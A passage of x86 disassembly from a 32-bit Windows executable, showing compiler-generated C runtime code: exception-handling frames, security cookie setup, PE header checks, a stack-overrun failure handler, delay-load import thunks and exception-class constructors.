  405f46:	movzx  ebx,WORD PTR [ecx+0x6]
  405f4a:	add    eax,0x18
  405f4d:	add    eax,ecx
  405f4f:	test   ebx,ebx
  405f51:	je     0x405f6e
  405f53:	mov    edi,DWORD PTR [ebp+0xc]
  405f56:	mov    esi,DWORD PTR [eax+0xc]
  405f59:	cmp    edi,esi
  405f5b:	jb     0x405f66
  405f5d:	mov    ecx,DWORD PTR [eax+0x8]
  405f60:	add    ecx,esi
  405f62:	cmp    edi,ecx
  405f64:	jb     0x405f70
  405f66:	inc    edx
  405f67:	add    eax,0x28
  405f6a:	cmp    edx,ebx
  405f6c:	jb     0x405f56
  405f6e:	xor    eax,eax
  405f70:	pop    edi
  405f71:	pop    esi
  405f72:	pop    ebx
  405f73:	pop    ebp
  405f74:	ret    
  405f75:	int3   
  405f76:	int3   
  405f77:	int3   
  405f78:	int3   
  405f79:	int3   
  405f7a:	int3   
  405f7b:	int3   
  405f7c:	int3   
  405f7d:	int3   
  405f7e:	int3   
  405f7f:	int3   
  405f80:	mov    edi,edi
  405f82:	push   ebp
  405f83:	mov    ebp,esp
  405f85:	push   0xfffffffe
  405f87:	push   0x407220
  405f8c:	push   0x4061b0
  405f91:	mov    eax,fs:0x0
  405f97:	push   eax
  405f98:	sub    esp,0x8
  405f9b:	push   ebx
  405f9c:	push   esi
  405f9d:	push   edi
  405f9e:	mov    eax,ds:0x409004
  405fa3:	xor    DWORD PTR [ebp-0x8],eax
  405fa6:	xor    eax,ebp
  405fa8:	push   eax
  405fa9:	lea    eax,[ebp-0x10]
  405fac:	mov    fs:0x0,eax
  405fb2:	mov    DWORD PTR [ebp-0x18],esp
  405fb5:	mov    DWORD PTR [ebp-0x4],0x0
  405fbc:	push   0x400000
  405fc1:	call   0x406050
  405fc6:	add    esp,0x4
  405fc9:	test   eax,eax
  405fcb:	je     0x406021
  405fcd:	mov    eax,DWORD PTR [ebp+0x8]
  405fd0:	sub    eax,0x400000
  405fd5:	push   eax
  405fd6:	push   0x400000
  405fdb:	call   0x405f30
  405fe0:	add    esp,0x8
  405fe3:	test   eax,eax
  405fe5:	je     0x406021
  405fe7:	mov    eax,DWORD PTR [eax+0x24]
  405fea:	shr    eax,0x1f
  405fed:	not    eax
  405fef:	and    eax,0x1
  405ff2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405ff9:	mov    ecx,DWORD PTR [ebp-0x10]
  405ffc:	mov    DWORD PTR fs:0x0,ecx
  406003:	pop    ecx
  406004:	pop    edi
  406005:	pop    esi
  406006:	pop    ebx
  406007:	mov    esp,ebp
  406009:	pop    ebp
  40600a:	ret    
  40600b:	mov    eax,DWORD PTR [ebp-0x14]
  40600e:	mov    eax,DWORD PTR [eax]
  406010:	xor    ecx,ecx
  406012:	cmp    DWORD PTR [eax],0xc0000005
  406018:	sete   cl
  40601b:	mov    eax,ecx
  40601d:	ret    
  40601e:	mov    esp,DWORD PTR [ebp-0x18]
  406021:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406028:	xor    eax,eax
  40602a:	mov    ecx,DWORD PTR [ebp-0x10]
  40602d:	mov    DWORD PTR fs:0x0,ecx
  406034:	pop    ecx
  406035:	pop    edi
  406036:	pop    esi
  406037:	pop    ebx
  406038:	mov    esp,ebp
  40603a:	pop    ebp
  40603b:	ret    
  40603c:	int3   
  40603d:	int3   
  40603e:	int3   
  40603f:	int3   
  406040:	int3   
  406041:	int3   
  406042:	int3   
  406043:	int3   
  406044:	int3   
  406045:	int3   
  406046:	int3   
  406047:	int3   
  406048:	int3   
  406049:	int3   
  40604a:	int3   
  40604b:	int3   
  40604c:	int3   
  40604d:	int3   
  40604e:	int3   
  40604f:	int3   
  406050:	mov    edi,edi
  406052:	push   ebp
  406053:	mov    ebp,esp
  406055:	mov    eax,DWORD PTR [ebp+0x8]
  406058:	mov    ecx,0x5a4d
  40605d:	cmp    WORD PTR [eax],cx
  406060:	je     0x406066
  406062:	xor    eax,eax
  406064:	pop    ebp
  406065:	ret    
  406066:	mov    ecx,DWORD PTR [eax+0x3c]
  406069:	add    ecx,eax
  40606b:	xor    eax,eax
  40606d:	cmp    DWORD PTR [ecx],0x4550
  406073:	jne    0x406081
  406075:	mov    edx,0x10b
  40607a:	cmp    WORD PTR [ecx+0x18],dx
  40607e:	sete   al
  406081:	pop    ebp
  406082:	ret    
  406083:	int3   
  406084:	int3   
  406085:	int3   
  406086:	int3   
  406087:	int3   
  406088:	mov    edi,edi
  40608a:	push   ebp
  40608b:	mov    ebp,esp
  40608d:	sub    esp,0x14
  406090:	and    DWORD PTR [ebp-0xc],0x0
  406094:	and    DWORD PTR [ebp-0x8],0x0
  406098:	mov    eax,ds:0x409004
  40609d:	push   esi
  40609e:	push   edi
  40609f:	mov    edi,0xbb40e64e
  4060a4:	mov    esi,0xffff0000
  4060a9:	cmp    eax,edi
  4060ab:	je     0x4060ba
  4060ad:	test   esi,eax
  4060af:	je     0x4060ba
  4060b1:	not    eax
  4060b3:	mov    ds:0x409008,eax
  4060b8:	jmp    0x406124
  4060ba:	lea    eax,[ebp-0xc]
  4060bd:	push   eax
  4060be:	call   DWORD PTR ds:0x40a010
  4060c4:	mov    eax,DWORD PTR [ebp-0x8]
  4060c7:	xor    eax,DWORD PTR [ebp-0xc]
  4060ca:	mov    DWORD PTR [ebp-0x4],eax
  4060cd:	call   DWORD PTR ds:0x40a0e4
  4060d3:	xor    DWORD PTR [ebp-0x4],eax
  4060d6:	call   DWORD PTR ds:0x40a0e8
  4060dc:	xor    DWORD PTR [ebp-0x4],eax
  4060df:	call   DWORD PTR ds:0x40a130
  4060e5:	xor    eax,DWORD PTR [ebp-0x4]
  4060e8:	lea    ecx,[ebp-0x4]
  4060eb:	xor    eax,ecx
  4060ed:	mov    DWORD PTR [ebp-0x4],eax
  4060f0:	lea    eax,[ebp-0x14]
  4060f3:	push   eax
  4060f4:	call   DWORD PTR ds:0x40a104
  4060fa:	mov    eax,DWORD PTR [ebp-0x10]
  4060fd:	xor    eax,DWORD PTR [ebp-0x14]
  406100:	mov    ecx,DWORD PTR [ebp-0x4]
  406103:	xor    ecx,eax
  406105:	cmp    ecx,edi
  406107:	je     0x406111
  406109:	test   DWORD PTR ds:0x409004,esi
  40610f:	jne    0x406116
  406111:	mov    ecx,0xbb40e64f
  406116:	mov    DWORD PTR ds:0x409004,ecx
  40611c:	not    ecx
  40611e:	mov    DWORD PTR ds:0x409008,ecx
  406124:	pop    edi
  406125:	pop    esi
  406126:	mov    esp,ebp
  406128:	pop    ebp
  406129:	ret    
  40612a:	int3   
  40612b:	int3   
  40612c:	int3   
  40612d:	int3   
  40612e:	int3   
  40612f:	push   0x30000
  406134:	push   0x10000
  406139:	call   DWORD PTR ds:0x40a160
  40613f:	pop    ecx
  406140:	pop    ecx
  406141:	ret    
  406142:	int3   
  406143:	int3   
  406144:	int3   
  406145:	int3   
  406146:	int3   
  406147:	int3   
  406148:	jmp    DWORD PTR ds:0x40a174
  40614e:	int3   
  40614f:	int3   
  406150:	int3   
  406151:	int3   
  406152:	int3   
  406153:	int3   
  406154:	push   0x4061b0
  406159:	push   DWORD PTR fs:0x0
  406160:	mov    eax,DWORD PTR [esp+0x10]
  406164:	mov    DWORD PTR [esp+0x10],ebp
  406168:	lea    ebp,[esp+0x10]
  40616c:	sub    esp,eax
  40616e:	push   ebx
  40616f:	push   esi
  406170:	push   edi
  406171:	mov    eax,ds:0x409004
  406176:	xor    DWORD PTR [ebp-0x4],eax
  406179:	xor    eax,ebp
  40617b:	mov    DWORD PTR [ebp-0x1c],eax
  40617e:	push   eax
  40617f:	mov    DWORD PTR [ebp-0x18],esp
  406182:	push   DWORD PTR [ebp-0x8]
  406185:	mov    eax,DWORD PTR [ebp-0x4]
  406188:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40618f:	mov    DWORD PTR [ebp-0x8],eax
  406192:	lea    eax,[ebp-0x10]
  406195:	mov    fs:0x0,eax
  40619b:	ret    
  40619c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40619f:	xor    ecx,ebp
  4061a1:	call   0x405d80
  4061a6:	jmp    0x406491
  4061ab:	int3   
  4061ac:	int3   
  4061ad:	int3   
  4061ae:	int3   
  4061af:	int3   
  4061b0:	mov    edi,edi
  4061b2:	push   ebp
  4061b3:	mov    ebp,esp
  4061b5:	push   DWORD PTR [ebp+0x14]
  4061b8:	push   DWORD PTR [ebp+0x10]
  4061bb:	push   DWORD PTR [ebp+0xc]
  4061be:	push   DWORD PTR [ebp+0x8]
  4061c1:	push   0x405d80
  4061c6:	push   0x409004
  4061cb:	call   0x4064aa
  4061d0:	add    esp,0x18
  4061d3:	pop    ebp
  4061d4:	ret    
  4061d5:	int3   
  4061d6:	int3   
  4061d7:	int3   
  4061d8:	int3   
  4061d9:	int3   
  4061da:	push   0x18
  4061dc:	push   0x407240
  4061e1:	call   0x406154
  4061e6:	and    DWORD PTR [ebp-0x28],0x0
  4061ea:	mov    eax,ds:0x409544
  4061ef:	mov    DWORD PTR [ebp-0x20],eax
  4061f2:	cmp    eax,0xffffffff
  4061f5:	jne    0x40620d
  4061f7:	push   DWORD PTR [ebp+0x8]
  4061fa:	mov    esi,DWORD PTR ds:0x40a164
  406200:	mov    ecx,esi
  406202:	call   DWORD PTR ds:0x40a1ec
  406208:	call   esi
  40620a:	pop    ecx
  40620b:	jmp    0x406261
  40620d:	push   0x8
  40620f:	call   0x4064b6
  406214:	pop    ecx
  406215:	and    DWORD PTR [ebp-0x4],0x0
  406219:	mov    eax,ds:0x409544
  40621e:	mov    DWORD PTR [ebp-0x20],eax
  406221:	mov    eax,ds:0x409540
  406226:	mov    DWORD PTR [ebp-0x24],eax
  406229:	lea    eax,[ebp-0x24]
  40622c:	push   eax
  40622d:	lea    eax,[ebp-0x20]
  406230:	push   eax
  406231:	push   DWORD PTR [ebp+0x8]
  406234:	call   0x4064ce
  406239:	add    esp,0xc
  40623c:	mov    esi,eax
  40623e:	mov    DWORD PTR [ebp-0x28],esi
  406241:	mov    ecx,DWORD PTR [ebp-0x20]
  406244:	mov    DWORD PTR ds:0x409544,ecx
  40624a:	mov    ecx,DWORD PTR [ebp-0x24]
  40624d:	mov    DWORD PTR ds:0x409540,ecx
  406253:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40625a:	call   0x40626a
  40625f:	mov    eax,esi
  406261:	call   0x40619c
  406266:	ret    
  406267:	mov    esi,DWORD PTR [ebp-0x28]
  40626a:	push   0x8
  40626c:	call   0x4064c2
  406271:	pop    ecx
  406272:	ret    
  406273:	int3   
  406274:	int3   
  406275:	int3   
  406276:	int3   
  406277:	int3   
  406278:	mov    edi,edi
  40627a:	push   ebp
  40627b:	mov    ebp,esp
  40627d:	push   DWORD PTR [ebp+0x8]
  406280:	call   0x4061da
  406285:	neg    eax
  406287:	pop    ecx
  406288:	sbb    eax,eax
  40628a:	neg    eax
  40628c:	dec    eax
  40628d:	pop    ebp
  40628e:	ret    
  40628f:	int3   
  406290:	int3   
  406291:	int3   
  406292:	int3   
  406293:	int3   
  406294:	int3   
  406295:	int3   
  406296:	int3   
  406297:	int3   
  406298:	int3   
  406299:	int3   
  40629a:	int3   
  40629b:	int3   
  40629c:	int3   
  40629d:	int3   
  40629e:	int3   
  40629f:	int3   
  4062a0:	ret    
  4062a1:	int3   
  4062a2:	int3   
  4062a3:	int3   
  4062a4:	int3   
  4062a5:	int3   
  4062a6:	mov    edi,edi
  4062a8:	push   ebp
  4062a9:	mov    ebp,esp
  4062ab:	push   0x0
  4062ad:	call   DWORD PTR ds:0x40a094
  4062b3:	push   DWORD PTR [ebp+0x8]
  4062b6:	call   DWORD PTR ds:0x40a090
  4062bc:	push   0xc0000409
  4062c1:	call   DWORD PTR ds:0x40a0ec
  4062c7:	push   eax
  4062c8:	call   DWORD PTR ds:0x40a0f0
  4062ce:	pop    ebp
  4062cf:	ret    
  4062d0:	int3   
  4062d1:	int3   
  4062d2:	int3   
  4062d3:	int3   
  4062d4:	int3   
  4062d5:	mov    edi,edi
  4062d7:	push   ebp
  4062d8:	mov    ebp,esp
  4062da:	sub    esp,0x324
  4062e0:	mov    ds:0x409270,eax
  4062e5:	mov    DWORD PTR ds:0x40926c,ecx
  4062eb:	mov    DWORD PTR ds:0x409268,edx
  4062f1:	mov    DWORD PTR ds:0x409264,ebx
  4062f7:	mov    DWORD PTR ds:0x409260,esi
  4062fd:	mov    DWORD PTR ds:0x40925c,edi
  406303:	data16 mov WORD PTR ds:0x409288,ss
  40630a:	data16 mov WORD PTR ds:0x40927c,cs
  406311:	data16 mov WORD PTR ds:0x409258,ds
  406318:	data16 mov WORD PTR ds:0x409254,es
  40631f:	data16 mov WORD PTR ds:0x409250,fs
  406326:	data16 mov WORD PTR ds:0x40924c,gs
  40632d:	pushf  
  40632e:	pop    DWORD PTR ds:0x409280
  406334:	mov    eax,DWORD PTR [ebp+0x0]
  406337:	mov    ds:0x409274,eax
  40633c:	mov    eax,DWORD PTR [ebp+0x4]
  40633f:	mov    ds:0x409278,eax
  406344:	lea    eax,[ebp+0x8]
  406347:	mov    ds:0x409284,eax
  40634c:	mov    eax,DWORD PTR [ebp-0x324]
  406352:	mov    DWORD PTR ds:0x4091c0,0x10001
  40635c:	mov    eax,ds:0x409278
  406361:	mov    ds:0x40917c,eax
  406366:	mov    DWORD PTR ds:0x409170,0xc0000409
  406370:	mov    DWORD PTR ds:0x409174,0x1
  40637a:	mov    DWORD PTR ds:0x409180,0x3
  406384:	push   0x4
  406386:	pop    eax
  406387:	imul   eax,eax,0x0
  40638a:	mov    DWORD PTR [eax+0x409184],0x2
  406394:	push   0x4
  406396:	pop    eax
  406397:	shl    eax,0x0
  40639a:	mov    ecx,DWORD PTR ds:0x409004
  4063a0:	mov    DWORD PTR [eax+0x409184],ecx
  4063a6:	push   0x4
  4063a8:	pop    eax
  4063a9:	shl    eax,1
  4063ab:	mov    ecx,DWORD PTR ds:0x409008
  4063b1:	mov    DWORD PTR [eax+0x409184],ecx
  4063b7:	push   0x4
  4063b9:	pop    eax
  4063ba:	imul   eax,eax,0x0
  4063bd:	mov    ecx,DWORD PTR ds:0x409004
  4063c3:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4063c7:	push   0x4
  4063c9:	pop    eax
  4063ca:	shl    eax,0x0
  4063cd:	mov    ecx,DWORD PTR ds:0x409008
  4063d3:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4063d7:	push   0x4011a0
  4063dc:	call   0x4062a6
  4063e1:	mov    esp,ebp
  4063e3:	pop    ebp
  4063e4:	ret    
  4063e5:	int3   
  4063e6:	int3   
  4063e7:	int3   
  4063e8:	int3   
  4063e9:	int3   
  4063ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4063ed:	mov    DWORD PTR fs:0x0,ecx
  4063f4:	pop    ecx
  4063f5:	pop    edi
  4063f6:	pop    edi
  4063f7:	pop    esi
  4063f8:	pop    ebx
  4063f9:	mov    esp,ebp
  4063fb:	pop    ebp
  4063fc:	push   ecx
  4063fd:	ret    
  4063fe:	int3   
  4063ff:	int3   
  406400:	int3   
  406401:	int3   
  406402:	int3   
  406403:	push   eax
  406404:	push   DWORD PTR fs:0x0
  40640b:	lea    eax,[esp+0xc]
  40640f:	sub    esp,DWORD PTR [esp+0xc]
  406413:	push   ebx
  406414:	push   esi
  406415:	push   edi
  406416:	mov    DWORD PTR [eax],ebp
  406418:	mov    ebp,eax
  40641a:	mov    eax,ds:0x409004
  40641f:	xor    eax,ebp
  406421:	push   eax
  406422:	mov    DWORD PTR [ebp-0x10],esp
  406425:	push   DWORD PTR [ebp-0x4]
  406428:	mov    DWORD PTR [ebp-0x4],0xffffffff
  40642f:	lea    eax,[ebp-0xc]
  406432:	mov    fs:0x0,eax
  406438:	ret    
  406439:	int3   
  40643a:	int3   
  40643b:	int3   
  40643c:	int3   
  40643d:	int3   
  40643e:	jmp    DWORD PTR ds:0x40a16c
  406444:	int3   
  406445:	int3   
  406446:	int3   
  406447:	int3   
  406448:	int3   
  406449:	int3   
  40644a:	int3   
  40644b:	int3   
  40644c:	push   0x4061b0
  406451:	push   DWORD PTR fs:0x0
  406458:	mov    eax,DWORD PTR [esp+0x10]
  40645c:	mov    DWORD PTR [esp+0x10],ebp
  406460:	lea    ebp,[esp+0x10]
  406464:	sub    esp,eax
  406466:	push   ebx
  406467:	push   esi
  406468:	push   edi
  406469:	mov    eax,ds:0x409004
  40646e:	xor    DWORD PTR [ebp-0x4],eax
  406471:	xor    eax,ebp
  406473:	push   eax
  406474:	mov    DWORD PTR [ebp-0x18],esp
  406477:	push   DWORD PTR [ebp-0x8]
  40647a:	mov    eax,DWORD PTR [ebp-0x4]
  40647d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406484:	mov    DWORD PTR [ebp-0x8],eax
  406487:	lea    eax,[ebp-0x10]
  40648a:	mov    fs:0x0,eax
  406490:	ret    
  406491:	mov    ecx,DWORD PTR [ebp-0x10]
  406494:	mov    DWORD PTR fs:0x0,ecx
  40649b:	pop    ecx
  40649c:	pop    edi
  40649d:	pop    edi
  40649e:	pop    esi
  40649f:	pop    ebx
  4064a0:	mov    esp,ebp
  4064a2:	pop    ebp
  4064a3:	push   ecx
  4064a4:	ret    
  4064a5:	int3   
  4064a6:	int3   
  4064a7:	int3   
  4064a8:	int3   
  4064a9:	int3   
  4064aa:	jmp    DWORD PTR ds:0x40a154
  4064b0:	int3   
  4064b1:	int3   
  4064b2:	int3   
  4064b3:	int3   
  4064b4:	int3   
  4064b5:	int3   
  4064b6:	jmp    DWORD PTR ds:0x40a150
  4064bc:	int3   
  4064bd:	int3   
  4064be:	int3   
  4064bf:	int3   
  4064c0:	int3   
  4064c1:	int3   
  4064c2:	jmp    DWORD PTR ds:0x40a158
  4064c8:	int3   
  4064c9:	int3   
  4064ca:	int3   
  4064cb:	int3   
  4064cc:	int3   
  4064cd:	int3   
  4064ce:	jmp    DWORD PTR ds:0x40a15c
  4064d4:	int3   
  4064d5:	int3   
  4064d6:	int3   
  4064d7:	int3   
  4064d8:	int3   
  4064d9:	int3   
  4064da:	int3   
  4064db:	int3   
  4064dc:	int3   
  4064dd:	int3   
  4064de:	int3   
  4064df:	int3   
  4064e0:	mov    eax,0x40b060
  4064e5:	jmp    0x4064ef
  4064ea:	int3   
  4064eb:	int3   
  4064ec:	int3   
  4064ed:	int3   
  4064ee:	int3   
  4064ef:	push   ecx
  4064f0:	push   edx
  4064f1:	push   eax
  4064f2:	push   0x4073d0
  4064f7:	call   0x4059e6
  4064fc:	pop    edx
  4064fd:	pop    ecx
  4064fe:	jmp    eax
  406500:	int3   
  406501:	int3   
  406502:	int3   
  406503:	int3   
  406504:	int3   
  406505:	int3   
  406506:	int3   
  406507:	int3   
  406508:	int3   
  406509:	int3   
  40650a:	int3   
  40650b:	int3   
  40650c:	int3   
  40650d:	int3   
  40650e:	int3   
  40650f:	int3   
  406510:	mov    eax,0x40b000
  406515:	jmp    0x40651f
  40651a:	int3   
  40651b:	int3   
  40651c:	int3   
  40651d:	int3   
  40651e:	int3   
  40651f:	push   ecx
  406520:	push   edx
  406521:	push   eax
  406522:	push   0x4073f0
  406527:	call   0x4059e6
  40652c:	pop    edx
  40652d:	pop    ecx
  40652e:	jmp    eax
  406530:	int3   
  406531:	int3   
  406532:	int3   
  406533:	int3   
  406534:	int3   
  406535:	int3   
  406536:	int3   
  406537:	int3   
  406538:	int3   
  406539:	int3   
  40653a:	int3   
  40653b:	int3   
  40653c:	int3   
  40653d:	int3   
  40653e:	int3   
  40653f:	int3   
  406540:	mov    eax,0x40b004
  406545:	jmp    0x40651f
  40654a:	int3   
  40654b:	int3   
  40654c:	int3   
  40654d:	int3   
  40654e:	int3   
  40654f:	int3   
  406550:	mov    eax,0x40b008
  406555:	jmp    0x40651f
  40655a:	int3   
  40655b:	int3   
  40655c:	int3   
  40655d:	int3   
  40655e:	int3   
  40655f:	int3   
  406560:	mov    eax,0x40b00c
  406565:	jmp    0x40651f
  40656a:	int3   
  40656b:	int3   
  40656c:	int3   
  40656d:	int3   
  40656e:	int3   
  40656f:	int3   
  406570:	mov    eax,0x40b010
  406575:	jmp    0x40651f
  40657a:	int3   
  40657b:	int3   
  40657c:	int3   
  40657d:	int3   
  40657e:	int3   
  40657f:	int3   
  406580:	mov    eax,0x40b014
  406585:	jmp    0x40651f
  40658a:	int3   
  40658b:	int3   
  40658c:	int3   
  40658d:	int3   
  40658e:	int3   
  40658f:	int3   
  406590:	mov    eax,0x40b018
  406595:	jmp    0x40651f
  40659a:	int3   
  40659b:	int3   
  40659c:	int3   
  40659d:	int3   
  40659e:	int3   
  40659f:	int3   
  4065a0:	jmp    DWORD PTR ds:0x40b018
  4065a6:	int3   
  4065a7:	int3   
  4065a8:	int3   
  4065a9:	int3   
  4065aa:	int3   
  4065ab:	int3   
  4065ac:	int3   
  4065ad:	int3   
  4065ae:	int3   
  4065af:	int3   
  4065b0:	mov    eax,0x40b01c
  4065b5:	jmp    0x40651f
  4065ba:	int3   
  4065bb:	int3   
  4065bc:	int3   
  4065bd:	int3   
  4065be:	int3   
  4065bf:	int3   
  4065c0:	mov    eax,0x40b020
  4065c5:	jmp    0x40651f
  4065ca:	int3   
  4065cb:	int3   
  4065cc:	int3   
  4065cd:	int3   
  4065ce:	int3   
  4065cf:	int3   
  4065d0:	mov    eax,0x40b024
  4065d5:	jmp    0x40651f
  4065da:	int3   
  4065db:	int3   
  4065dc:	int3   
  4065dd:	int3   
  4065de:	int3   
  4065df:	int3   
  4065e0:	jmp    DWORD PTR ds:0x40b024
  4065e6:	int3   
  4065e7:	int3   
  4065e8:	int3   
  4065e9:	int3   
  4065ea:	int3   
  4065eb:	int3   
  4065ec:	int3   
  4065ed:	int3   
  4065ee:	int3   
  4065ef:	int3   
  4065f0:	mov    eax,0x40b028
  4065f5:	jmp    0x40651f
  4065fa:	int3   
  4065fb:	int3   
  4065fc:	int3   
  4065fd:	int3   
  4065fe:	int3   
  4065ff:	int3   
  406600:	mov    eax,0x40b02c
  406605:	jmp    0x40651f
  40660a:	int3   
  40660b:	int3   
  40660c:	int3   
  40660d:	int3   
  40660e:	int3   
  40660f:	int3   
  406610:	mov    eax,0x40b030
  406615:	jmp    0x40651f
  40661a:	int3   
  40661b:	int3   
  40661c:	int3   
  40661d:	int3   
  40661e:	int3   
  40661f:	int3   
  406620:	mov    eax,0x40b034
  406625:	jmp    0x40651f
  40662a:	int3   
  40662b:	int3   
  40662c:	int3   
  40662d:	int3   
  40662e:	int3   
  40662f:	int3   
  406630:	mov    eax,0x40b038
  406635:	jmp    0x40651f
  40663a:	int3   
  40663b:	int3   
  40663c:	int3   
  40663d:	int3   
  40663e:	int3   
  40663f:	int3   
  406640:	mov    eax,0x40b03c
  406645:	jmp    0x40651f
  40664a:	int3   
  40664b:	int3   
  40664c:	int3   
  40664d:	int3   
  40664e:	int3   
  40664f:	int3   
  406650:	mov    eax,0x40b040
  406655:	jmp    0x40651f
  40665a:	int3   
  40665b:	int3   
  40665c:	int3   
  40665d:	int3   
  40665e:	int3   
  40665f:	int3   
  406660:	mov    eax,0x40b044
  406665:	jmp    0x40651f
  40666a:	int3   
  40666b:	int3   
  40666c:	int3   
  40666d:	int3   
  40666e:	int3   
  40666f:	int3   
  406670:	mov    eax,0x40b048
  406675:	jmp    0x40651f
  40667a:	int3   
  40667b:	int3   
  40667c:	int3   
  40667d:	int3   
  40667e:	int3   
  40667f:	int3   
  406680:	mov    eax,0x40b04c
  406685:	jmp    0x40651f
  40668a:	int3   
  40668b:	int3   
  40668c:	int3   
  40668d:	int3   
  40668e:	int3   
  40668f:	int3   
  406690:	mov    eax,0x40b050
  406695:	jmp    0x40651f
  40669a:	int3   
  40669b:	int3   
  40669c:	int3   
  40669d:	int3   
  40669e:	int3   
  40669f:	int3   
  4066a0:	mov    eax,0x40b054
  4066a5:	jmp    0x40651f
  4066aa:	int3   
  4066ab:	int3   
  4066ac:	int3   
  4066ad:	int3   
  4066ae:	int3   
  4066af:	int3   
  4066b0:	mov    eax,0x40b058
  4066b5:	jmp    0x40651f
  4066ba:	int3   
  4066bb:	int3   
  4066bc:	int3   
  4066bd:	int3   
  4066be:	int3   
  4066bf:	int3   
  4066c0:	jmp    DWORD PTR ds:0x40a030
  4066c6:	int3   
  4066c7:	int3   
  4066c8:	int3   
  4066c9:	int3   
  4066ca:	int3   
  4066cb:	mov    edi,edi
  4066cd:	push   ebp
  4066ce:	mov    ebp,esp
  4066d0:	jmp    0x4066df
  4066d2:	push   DWORD PTR [ebp+0x8]
  4066d5:	call   0x406f8e
  4066da:	pop    ecx
  4066db:	test   eax,eax
  4066dd:	je     0x4066ef
  4066df:	push   DWORD PTR [ebp+0x8]
  4066e2:	call   DWORD PTR ds:0x40a1b8
  4066e8:	pop    ecx
  4066e9:	test   eax,eax
  4066eb:	je     0x4066d2
  4066ed:	pop    ebp
  4066ee:	ret    
  4066ef:	jmp    0x406ad5
  4066f4:	int3   
  4066f5:	int3   
  4066f6:	int3   
  4066f7:	int3   
  4066f8:	int3   
  4066f9:	mov    edi,edi
  4066fb:	push   ebp
  4066fc:	mov    ebp,esp
  4066fe:	mov    eax,DWORD PTR [ebp+0x8]
  406701:	xor    ecx,ecx
  406703:	test   eax,eax
  406705:	je     0x40671e
  406707:	cmp    eax,0xffffffff
  40670a:	ja     0x406719
  40670c:	push   eax
  40670d:	call   0x4066cb
  406712:	pop    ecx
  406713:	mov    ecx,eax
  406715:	test   ecx,ecx
  406717:	jne    0x40671e
  406719:	jmp    0x406ad5
  40671e:	mov    eax,ecx
  406720:	pop    ebp
  406721:	ret    
  406722:	int3   
  406723:	int3   
  406724:	int3   
  406725:	int3   
  406726:	int3   
  406727:	mov    edi,edi
  406729:	push   ebp
  40672a:	mov    ebp,esp
  40672c:	push   esi
  40672d:	push   DWORD PTR [ebp+0x8]
  406730:	mov    esi,ecx
  406732:	and    DWORD PTR [esi+0x10],0x0
  406736:	mov    DWORD PTR [esi+0x14],0xf
  40673d:	mov    BYTE PTR [esi],0x0
  406740:	call   0x406e17
  406745:	pop    ecx
  406746:	push   eax
  406747:	push   DWORD PTR [ebp+0x8]
  40674a:	mov    ecx,esi
  40674c:	call   0x406bfe
  406751:	mov    eax,esi
  406753:	pop    esi
  406754:	pop    ebp
  406755:	ret    0x4
  406758:	int3   
  406759:	int3   
  40675a:	int3   
  40675b:	int3   
  40675c:	int3   
  40675d:	int3   
  40675e:	int3   
  40675f:	int3   
  406760:	mov    edi,edi
  406762:	push   ebp
  406763:	mov    ebp,esp
  406765:	push   ecx
  406766:	push   esi
  406767:	push   DWORD PTR [ebp+0x8]
  40676a:	mov    esi,ecx
  40676c:	mov    DWORD PTR [ebp-0x4],esi
  40676f:	call   0x406fc0
  406774:	mov    DWORD PTR [esi],0x4011cc
  40677a:	mov    eax,esi
  40677c:	pop    esi
  40677d:	mov    esp,ebp
  40677f:	pop    ebp
  406780:	ret    0x4
  406783:	int3   
  406784:	int3   
  406785:	int3   
  406786:	int3   
  406787:	int3   
  406788:	mov    edi,edi
  40678a:	push   ebp
  40678b:	mov    ebp,esp
  40678d:	push   ecx
  40678e:	push   esi
  40678f:	push   0x1
  406791:	lea    eax,[ebp-0x4]
  406794:	mov    DWORD PTR [ebp-0x4],0x402878
  40679b:	push   eax
  40679c:	mov    esi,ecx
  40679e:	call   0x406fa6
  4067a3:	mov    DWORD PTR [esi],0x4011cc
  4067a9:	mov    eax,esi
  4067ab:	pop    esi
  4067ac:	mov    esp,ebp
  4067ae:	pop    ebp
  4067af:	ret    
  4067b0:	int3   
  4067b1:	int3   
  4067b2:	int3   
  4067b3:	int3   
  4067b4:	int3   
  4067b5:	int3   
  4067b6:	int3   
  4067b7:	int3   
  4067b8:	int3   
  4067b9:	int3   
  4067ba:	int3   
  4067bb:	int3   
  4067bc:	int3   
  4067bd:	int3   
  4067be:	int3   
  4067bf:	int3   
  4067c0:	mov    edi,edi
  4067c2:	push   ebp
  4067c3:	mov    ebp,esp
  4067c5:	push   ecx
  4067c6:	push   esi
  4067c7:	push   DWORD PTR [ebp+0x8]
  4067ca:	mov    esi,ecx
  4067cc:	mov    DWORD PTR [ebp-0x4],esi
  4067cf:	call   0x406fc0
  4067d4:	mov    DWORD PTR [esi],0x4011d4
  4067da:	mov    eax,esi
  4067dc:	pop    esi
  4067dd:	mov    esp,ebp
  4067df:	pop    ebp
  4067e0:	ret    0x4
  4067e3:	int3   
  4067e4:	int3   
  4067e5:	int3   
  4067e6:	int3   
  4067e7:	int3   
  4067e8:	mov    edi,edi
  4067ea:	push   ebp
  4067eb:	mov    ebp,esp
  4067ed:	push   ecx
  4067ee:	mov    eax,DWORD PTR [ebp+0x8]
  4067f1:	push   esi
  4067f2:	mov    esi,ecx
  4067f4:	mov    DWORD PTR [ebp-0x4],esi
  4067f7:	mov    DWORD PTR [ebp-0x4],eax
  4067fa:	lea    eax,[ebp-0x4]
  4067fd:	push   eax
  4067fe:	call   0x406f9a
  406803:	mov    DWORD PTR [esi],0x4011d4
  406809:	mov    eax,esi
  40680b:	pop    esi
  40680c:	mov    esp,ebp
  40680e:	pop    ebp
  40680f:	ret    0x4
  406812:	int3   
  406813:	int3   
  406814:	int3   
  406815:	int3   
  406816:	int3   
  406817:	int3   
  406818:	int3   
  406819:	int3   
  40681a:	int3   
  40681b:	int3   
  40681c:	int3   
  40681d:	int3   
  40681e:	int3   
  40681f:	int3   
  406820:	mov    DWORD PTR [ecx],0x4011cc
  406826:	jmp    0x406fcc
  40682b:	int3   
  40682c:	int3   
  40682d:	int3   
  40682e:	int3   
  40682f:	int3   
  406830:	jmp    0x406fcc
  406835:	int3   
  406836:	int3   
